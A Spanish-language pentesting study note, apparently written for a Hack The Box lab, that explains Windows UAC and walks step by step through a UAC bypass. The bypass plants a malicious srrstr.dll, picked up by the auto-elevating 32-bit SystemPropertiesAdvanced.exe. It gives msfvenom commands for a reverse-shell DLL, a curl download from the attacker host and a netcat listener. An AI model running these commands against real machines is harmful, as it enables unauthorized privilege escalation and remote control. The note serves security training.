tags:
___
# 🗂️ User Account Control (UAC) — Funcionamiento y Bypass mediante DLL Hijacking

## 🧠 Concepto clave
**UAC (User Account Control)** es una característica de Windows que obliga a que las aplicaciones corran con privilegios de usuario estándar por defecto, requiriendo confirmación explícita del administrador para ejecutar acciones elevadas. No es un límite de seguridad como tal, sino una capa de fricción adicional que puede ralentizar a un atacante y forzarle a ser más ruidoso. Esta sección cubre cómo funciona UAC, cómo enumerarlo y cómo bypasearlo mediante DLL hijacking en un binario auto-elevado. 📄 [Cómo funciona UAC — Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)

| Concepto | Qué es | Implicación |
|---|---|---|
| **Admin Approval Mode (AAM)** | Modo en el que incluso los administradores operan con un token de usuario estándar por defecto, recibiendo un segundo token elevado solo cuando es necesario | Un usuario en el grupo Administrators tiene dos tokens: uno estándar (medio) y uno elevado (alto). Sin elevar, opera con el estándar |
| **Auto-elevación** | Ciertos binarios firmados de Windows se elevan automáticamente sin mostrar el prompt de UAC | Si uno de estos binarios intenta cargar una DLL que no existe y esa ruta es escribible por el usuario, se puede hacer DLL hijacking en contexto elevado |
| **Mandatory Level** | Nivel de integridad del proceso: Low, Medium, High, System | Un proceso Medium no puede interactuar con procesos High/System — el bypass de UAC consiste en pasar de Medium a High sin el prompt |

## 📌 Puntos importantes

### Cómo opera UAC con cuentas de administrador

Cuando UAC está activo, incluso los administradores locales operan por defecto con su **token no privilegiado** (nivel Medium). Al intentar realizar una acción que requiere elevación, Windows muestra el prompt de consentimiento y, si se aprueba, lanza el proceso con el **token elevado** (nivel High). La cuenta RID 500 (administrador built-in) es la única excepción — siempre opera en High independientemente de AAM.

Esto significa que un usuario como `sarah`, que es miembro del grupo Administrators, verá un `whoami /priv` muy limitado en su sesión normal, sin acceso a privilegios como `SeDebugPrivilege`, `SeBackupPrivilege` o `SeImpersonatePrivilege` — que sí aparecen al elevar.

### Configuración de UAC — Group Policy

UAC tiene 10 configuraciones de Group Policy que controlan su comportamiento. 📄 [UAC Security Policy Settings — Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) Las más relevantes desde el punto de vista ofensivo son:

| Clave de Registro | Función | Valor por defecto |
|---|---|---|
| `EnableLUA` | Activa/desactiva UAC completamente | Enabled |
| `ConsentPromptBehaviorAdmin` | Comportamiento del prompt para admins | `0x5` (Always Notify) |
| `ConsentPromptBehaviorUser` | Comportamiento del prompt para usuarios estándar | Prompt de credenciales |
| `FilterAdministratorToken` | Aplica AAM a la cuenta RID 500 | Disabled |

Los niveles de `ConsentPromptBehaviorAdmin` son: `0x0` (sin prompt), `0x1` (secure desktop), `0x2` (prompt siempre), `0x5` (Always Notify — nivel máximo, menos bypasses disponibles).

### Enumeración de UAC

Antes de intentar un bypass es esencial saber si UAC está activo y en qué nivel, ya que esto determina qué técnicas son aplicables. También es fundamental conocer la **versión exacta de Windows**, ya que cada bypass del repositorio UACME tiene rangos de builds específicos en los que funciona.

> [!info] **UACME** 📄 [UACME — hfiref0x](https://github.com/hfiref0x/UACME)
> Repositorio que mantiene una lista exhaustiva y actualizada de técnicas de bypass de UAC para Windows. Para cada técnica documenta: número de técnica, build de Windows afectado, método utilizado, y si Microsoft ha publicado un parche. Es la referencia estándar en pentesting para identificar qué bypass aplicar según la versión del sistema objetivo. Imprescindible consultar antes de intentar cualquier bypass de UAC.

### La técnica — DLL Hijacking en SystemPropertiesAdvanced.exe

El bypass usado en este ejemplo (técnica 54 de UACME, funcional desde build 14393 — Windows 1607) se basa en que la versión **32 bits** de `SystemPropertiesAdvanced.exe` es un binario de confianza que Windows auto-eleva sin prompt, y al ejecutarse intenta cargar la DLL `srrstr.dll` que **no existe en el sistema**. 📄 [SystemPropertiesAdvanced UAC Bypass — egre55](https://egre55.github.io/system-properties-uac-bypass)

Windows busca DLLs siguiendo este orden:
1. Directorio desde el que se cargó la aplicación
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directorios en la variable `PATH`

La carpeta `C:\Users\<usuario>\AppData\Local\Microsoft\WindowsApps` está en el PATH del usuario y es **escribible sin privilegios**. Al colocar una `srrstr.dll` maliciosa ahí, cuando `SystemPropertiesAdvanced.exe` se auto-eleve e intente cargar esa DLL, la encontrará en esa carpeta y la ejecutará en contexto elevado — sin mostrar ningún prompt de UAC.

---

### Flujo de explotación — UAC Bypass con DLL Hijacking

**Paso 1 — Confirmar que UAC está activo y comprobar su nivel**

> [!tip] Verificar si UAC (EnableLUA) está habilitado
> ```cmd
> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
> ```
> `/v EnableLUA` — Consulta el valor `EnableLUA`. `0x1` indica que UAC está activo. `0x0` indica que está deshabilitado — en ese caso no es necesario ningún bypass.

> [!tip] Comprobar el nivel de UAC configurado
> ```cmd
> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
> ```
> `/v ConsentPromptBehaviorAdmin` — Devuelve el nivel de UAC activo. Cruzar el valor con la tabla anterior para determinar qué bypasses son aplicables.

**Paso 2 — Identificar la versión exacta de Windows**

> [!tip] Obtener el número de build de Windows
> ```powershell
> [environment]::OSVersion.Version
> ```
> `OSVersion.Version` — Devuelve Major, Minor, Build y Revision del SO. El campo `Build` se cruza con 📄 [Windows 10 Version History — Wikipedia](https://en.wikipedia.org/wiki/Windows_10_version_history) para identificar la release exacta y determinar qué bypasses de UACME son aplicables.

**Paso 3 — Verificar que WindowsApps está en el PATH y es escribible**

> [!tip] Revisar el contenido de la variable PATH del usuario
> ```powershell
> cmd /c echo %PATH%
> ```
> `%PATH%` — Lista todos los directorios en el PATH. Confirmar que `C:\Users\<usuario>\AppData\Local\Microsoft\WindowsApps` aparece — es escribible por el usuario y será buscado por el binario auto-elevado al cargar DLLs.

**Paso 4 — Generar la DLL maliciosa en la máquina atacante**

> [!info] **msfvenom**
> Herramienta de Metasploit Framework para generar payloads standalone en múltiples formatos (exe, dll, elf, raw shellcode, etc.) y para distintas plataformas. Permite especificar el tipo de payload, la IP y puerto del listener, el formato de salida y opciones de encoding. Es la herramienta estándar para generar binarios maliciosos de forma rápida en pentesting.

> [!tip] Generar srrstr.dll como reverse shell con msfvenom
> ```bash
> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
> ```
> `-p windows/shell_reverse_tcp` — Payload de reverse shell para Windows x86 (32 bits, para coincidir con el binario SystemPropertiesAdvanced.exe de 32 bits).
> `LHOST=10.10.14.3` — IP de la máquina atacante que recibirá la conexión (IP de tun0 en HTB).
> `LPORT=8443` — Puerto en escucha en la máquina atacante.
> `-f dll` — Formato de salida como DLL de Windows.
> `> srrstr.dll` — Nombre del archivo de salida, debe coincidir exactamente con la DLL que el binario intenta cargar.

**Paso 5 — Servir la DLL y descargarla en el objetivo**

> [!tip] Levantar servidor HTTP para transferir la DLL
> ```bash
> sudo python3 -m http.server 8080
> ```
> `-m http.server 8080` — Levanta un servidor HTTP estático en el puerto 8080 desde el directorio actual donde está la DLL generada.

> [!tip] Descargar la DLL maliciosa en la carpeta WindowsApps del objetivo
> ```powershell
> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
> ```
> `http://10.10.14.3:8080/srrstr.dll` — URL del servidor HTTP atacante donde está alojada la DLL.
> `-O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"` — Ruta de destino en la carpeta WindowsApps, escribible sin privilegios y presente en el PATH.

**Paso 6 — Levantar el listener y verificar la DLL (opcional)**

> [!info] **Netcat (nc)**
> Herramienta de red de propósito general apodada "la navaja suiza de las redes". Permite crear conexiones TCP/UDP en modo cliente o servidor. En pentesting se usa principalmente para recibir reverse shells (modo listener), transferir archivos, o hacer port scanning básico. Viene preinstalada en la mayoría de distribuciones Linux y está disponible para Windows como `nc.exe`.

> [!tip] Levantar el listener de Netcat para recibir la reverse shell
> ```bash
> nc -lvnp 8443
> ```
> `-l` — Modo escucha (listener).
> `-v` — Verbose, muestra información de conexiones entrantes.
> `-n` — Sin resolución DNS, más rápido y sigiloso.
> `-p 8443` — Puerto en el que escuchar, debe coincidir con el LPORT del payload.

Se puede verificar que la DLL funciona ejecutándola directamente con `rundll32` — esto devolverá una shell **sin elevar** (contexto Medium), confirmando que el payload es correcto antes de intentar el bypass.

> [!info] **rundll32**
> Binario nativo de Windows (`C:\Windows\System32\rundll32.exe`) que permite ejecutar funciones exportadas de una DLL directamente desde la línea de comandos. Se usa legítimamente para cargar applets del Panel de Control y otras funcionalidades del sistema. En pentesting se abusa frecuentemente para ejecutar DLLs maliciosas de forma "legítima", ya que al ser un binario firmado por Microsoft puede evadir ciertas soluciones de seguridad.

> [!tip] Probar la DLL directamente con rundll32 (sin elevación — verificación del payload)
> ```cmd
> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
> ```
> `shell32.dll,Control_RunDLL` — Función de shell32 que carga y ejecuta una DLL como si fuera un applet del Panel de Control.
> La shell recibida mostrará privilegios de usuario estándar — esto es esperado y confirma que el payload funciona correctamente antes del bypass.

**Paso 7 — Terminar procesos rundll32 residuales antes del bypass**

> [!tip] Identificar y terminar procesos rundll32 activos de la prueba anterior
> ```cmd
> tasklist /svc | findstr "rundll32"
> taskkill /PID <PID> /F
> ```
> `tasklist /svc` — Lista todos los procesos activos con sus servicios asociados.
> `findstr "rundll32"` — Filtra la salida mostrando solo los procesos rundll32 con sus PIDs.
> `taskkill /PID <PID> /F` — Termina forzosamente el proceso con el PID indicado. Repetir para cada instancia activa antes de continuar.

**Paso 8 — Ejecutar el binario auto-elevado para triggear el bypass**

> [!info] **SystemPropertiesAdvanced.exe (32 bits)**
> Binario legítimo de Windows que abre el panel de Propiedades avanzadas del sistema. La versión de 32 bits (`C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`) está firmada por Microsoft y configurada para auto-elevarse sin mostrar prompt de UAC. Al ejecutarse, intenta cargar `srrstr.dll` (usada por System Restore) siguiendo el orden de búsqueda de DLLs de Windows. Si encuentra una versión maliciosa en una ruta del PATH antes que en System32, la cargará y ejecutará en contexto elevado (High integrity level) sin ninguna interacción del usuario.

> [!tip] Ejecutar la versión 32 bits de SystemPropertiesAdvanced.exe para triggear el UAC bypass
> ```cmd
> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
> ```
> `C:\Windows\SysWOW64\` — Directorio de binarios de 32 bits en sistemas Windows x64. Es crítico usar esta versión y no la de `System32`, ya que solo la versión 32 bits intenta cargar `srrstr.dll` desde el PATH.

Al ejecutarse, `SystemPropertiesAdvanced.exe` se auto-elevará sin prompt, buscará `srrstr.dll` en el PATH, la encontrará en WindowsApps y la ejecutará en contexto elevado — enviando la reverse shell con token High y todos los privilegios del administrador disponibles y habilitables.

---

## 🔗 Relaciones / Contexto

UAC es un obstáculo frecuente en la escalada de privilegios en Windows: se puede tener una cuenta de administrador local pero seguir operando con un token restringido. Los bypasses de UAC son el paso intermedio entre "tengo credenciales de admin" y "tengo un token elevado con todos los privilegios disponibles". Este bypass concreto combina dos técnicas — auto-elevación de binarios de confianza y DLL hijacking en el PATH — que por separado son conceptos fundamentales en Windows privesc. El repositorio UACME es la referencia más completa para mantenerse al día de técnicas vigentes según versión de Windows.